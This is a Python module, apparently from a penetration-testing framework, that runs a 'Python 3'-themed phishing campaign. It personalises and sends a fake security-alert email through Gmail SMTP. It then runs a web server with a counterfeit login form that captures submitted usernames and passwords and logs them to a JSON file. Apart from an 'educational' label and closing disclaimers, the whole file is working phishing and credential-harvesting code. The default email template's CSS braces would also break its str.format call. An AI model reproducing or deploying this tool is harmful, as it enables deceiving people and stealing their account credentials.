"""
phishing/python3_phish — safe module: send Python 3-themed phishing email via Gmail and run a phishing web server (educational)
"""
import os
from pathlib import Path
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import json
from datetime import datetime
from tabulate import tabulate

MODULE_INFO = {
    "name": "phishing/python3_phish",
    "description": "Send a Python 3-themed phishing email via Gmail and run a phishing web server (educational)"
}
OPTIONS = {
    "TARGET_NAME": {
        "required": True,
        "default": "User",
        "description": "Name of the target for email personalization"
    },
    "THEME": {
        "required": True,
        "default": "default",
        "description": "Theme for email and web page (loaded from TEMPLATE_DIR/*.html)"
    },
    "RECIPIENT": {
        "required": False,
        "default": "",
        "description": "Recipient email address (leave empty to only display)"
    },
    "SMTP_USER": {
        "required": False,
        "default": "",
        "description": "Gmail address for SMTP authentication"
    },
    "SMTP_PASS": {
        "required": False,
        "default": "",
        "description": "Gmail App Password for SMTP authentication"
    },
    "HOST": {
        "required": True,
        "default": "localhost",
        "description": "Host address for the phishing server"
    },
    "PORT": {
        "required": True,
        "default": "8080",
        "description": "Port for the phishing server"
    },
    "TEMPLATE_DIR": {
        "required": False,
        "default": str(Path(__file__).parent / "templates" / "phishing"),
        "description": "Directory containing email and web HTML templates"
    },
    "OUTPUT_FILE": {
        "required": False,
        "default": "email_output.html",
        "description": "File to save email HTML output"
    }
}

def load_template(template_dir, theme, template_type="email"):
    """Memuat template HTML untuk email atau web dari folder yang ditentukan."""
    template_path = Path(template_dir) / f"{theme}_{template_type}.html"
    if not template_path.exists():
        if template_type == "email":
            return {
                "subject": "Default Python 3 Security Alert",
                "body": """
<!DOCTYPE html>
<html>
<head>
    <title>Python 3 Security Alert</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .container { max-width: 600px; margin: auto; }
        .button { background-color: #0078D4; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Python 3 Security Alert</h2>
        <p>Dear {target_name},</p>
        <p>Please verify your account: <a href="{link}" class="button">Verify Now</a></p>
        <p>Thank you,<br>Python Security Team</p>
    </div>
</body>
</html>
"""
            }
        else:  # web
            return """
<!DOCTYPE html>
<html>
<head>
    <title>Python 3 Login</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .container { max-width: 400px; margin: auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px; }
        .button { background-color: #0078D4; color: white; padding: 10px; width: 100%; border: none; border-radius: 5px; cursor: pointer; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Python 3 Account Login</h2>
        <form method="post" action="/">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Login" class="button">
        </form>
    </div>
</body>
</html>
"""
    
    try:
        with template_path.open("r", encoding="utf-8") as f:
            content = f.read()
            if template_type == "email":
                subject = "Python 3 Phishing Email"
                for line in content.splitlines():
                    if "<title>" in line.lower():
                        subject = line.split("<title>")[1].split("</title>")[0].strip()
                        break
                return {"subject": subject, "body": content}
            return content
    except Exception as e:
        print(f"Error loading {template_type} template {template_path}: {e}")
        return None

def save_html_to_file(html_content, output_file):
    """Menyimpan konten HTML email ke file."""
    try:
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(html_content)
        return True, f"Email HTML saved to {output_file}. Open in browser to view."
    except Exception as e:
        return False, f"Failed to save email HTML: {e}"

def save_to_log(data):
    """Menyimpan data formulir ke file log dalam format JSON."""
    log_file = "phishing_log.json"
    try:
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "data": data
        }
        log_data = []
        if Path(log_file).exists():
            with open(log_file, "r", encoding="utf-8") as f:
                log_data = json.load(f)
        log_data.append(log_entry)
        with open(log_file, "w", encoding="utf-8") as f:
            json.dump(log_data, f, indent=2)
        return True, f"Data saved to {log_file}"
    except Exception as e:
        return False, f"Failed to save data: {e}"

def send_email(sender, recipient, subject, html_body, smtp_user, smtp_pass):
    """Mengirim email menggunakan Gmail SMTP."""
    if not recipient:
        return False, "No recipient specified; skipping email send."
    
    try:
        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = recipient
        msg['Subject'] = subject
        msg.attach(MIMEText(html_body, 'html'))

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        if smtp_user and smtp_pass:
            server.login(smtp_user, smtp_pass)
        else:
            return False, "SMTP_USER and SMTP_PASS are required for Gmail."
        server.sendmail(sender, recipient, msg.as_string())
        server.quit()
        return True, "Email sent successfully via Gmail."
    except Exception as e:
        return False, f"Failed to send email: {e}"

class PhishingHandler(BaseHTTPRequestHandler):
    """Handler untuk server phishing."""
    def __init__(self, template, *args, **kwargs):
        self.template = template
        super().__init__(*args, **kwargs)

    def do_GET(self):
        """Menangani permintaan GET untuk menampilkan halaman phishing."""
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(self.template.encode("utf-8"))

    def do_POST(self):
        """Menangani permintaan POST untuk menangkap data formulir."""
        content_length = int(self.headers["Content-Length"])
        post_data = self.rfile.read(content_length).decode("utf-8")
        parsed_data = urllib.parse.parse_qs(post_data)
        form_data = {key: value[0] for key, value in parsed_data.items()}
        
        success, message = save_to_log(form_data)
        
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        response = """
        <!DOCTYPE html>
        <html>
        <head><title>Success</title></head>
        <body><h2>Login Successful</h2><p>Thank you for logging in.</p></body>
        </html>
        """
        self.wfile.write(response.encode("utf-8"))
        print(f"\nCaptured data: {form_data}")
        print(message)

def run_server(host, port, template):
    """Menjalankan server HTTP untuk phishing."""
    class CustomHandler(PhishingHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(template, *args, **kwargs)

    server_address = (host, int(port))
    httpd = HTTPServer(server_address, CustomHandler)
    print(f"Starting phishing server on http://{host}:{port}")
    print("Press Ctrl+C to stop the server.")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped.")
        httpd.server_close()

def run(session, options):
    """Run phishing email and web server for Python 3-themed simulation."""
    target_name = options.get("TARGET_NAME", "User")
    theme = options.get("THEME", "default").lower()
    recipient = options.get("RECIPIENT", "")
    smtp_user = options.get("SMTP_USER", "")
    smtp_pass = options.get("SMTP_PASS", "")
    host = options.get("HOST", "localhost")
    port = options.get("PORT", "8080")
    template_dir = options.get("TEMPLATE_DIR", str(Path(__file__).parent / "templates" / "phishing"))
    output_file = options.get("OUTPUT_FILE", "email_output.html")
    
    # Load templates
    email_template = load_template(template_dir, theme, "email")
    web_template = load_template(template_dir, theme, "web")
    
    if not email_template:
        print(f"Failed to load email template for theme '{theme}'. Using default.")
        email_template = load_template(template_dir, "default", "email")
    if not web_template:
        print(f"Failed to load web template for theme '{theme}'. Using default.")
        web_template = load_template(template_dir, "default", "web")
    
    # Format link and email
    link = f"http://{host}:{port}"
    formatted_body = email_template["body"].format(target_name=target_name, link=link)
    
    # Save email HTML
    html_saved, html_message = save_html_to_file(formatted_body, output_file)
    
    # Send email if recipient is specified
    email_status = "Not sent (RECIPIENT not set)"
    if recipient:
        success, email_message = send_email(
            smtp_user, recipient, email_template["subject"], formatted_body,
            smtp_user, smtp_pass
        )
        email_status = email_message
    
    # Display output in table
    table_data = [
        ["Target Name", target_name],
        ["Theme", theme],
        ["Recipient", recipient or "Not set"],
        ["Email Status", email_status],
        ["HTML Output", html_message],
        ["Server", f"http://{host}:{port}"]
    ]
    print("\n=== Python 3 Phishing Simulation (Educational) ===")
    print(tabulate(table_data, headers=["Field", "Value"], tablefmt="grid"))
    print("\nNote: This is a simulated phishing email and server for educational purposes only.")
    print("Ensure you have permission to send emails and run servers in a controlled environment.")
    print("For Gmail, use an App Password for SMTP_PASS.")
    
    # Start phishing server
    run_server(host, port, web_template)
